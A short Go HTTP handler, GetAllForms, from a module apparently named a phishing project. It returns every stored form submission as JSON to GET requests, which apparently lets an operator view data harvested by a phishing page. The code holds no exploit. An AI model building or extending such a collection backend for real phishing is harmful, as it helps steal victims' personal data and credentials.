package handlers

import (
	"net/http"

	services "github.com/abhinandpn/Go-Html-Phishing/internal/services"
	utils "github.com/abhinandpn/Go-Html-Phishing/pkg"
)

// Fetch all submitted form data
func GetAllForms(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		utils.RespondJSON(w, http.StatusMethodNotAllowed, map[string]string{"error": "Only GET method is allowed"})
		return
	}

	// Retrieve all form data from the service
	formData := services.GetAllFormData()

	utils.RespondJSON(w, http.StatusOK, formData)
}
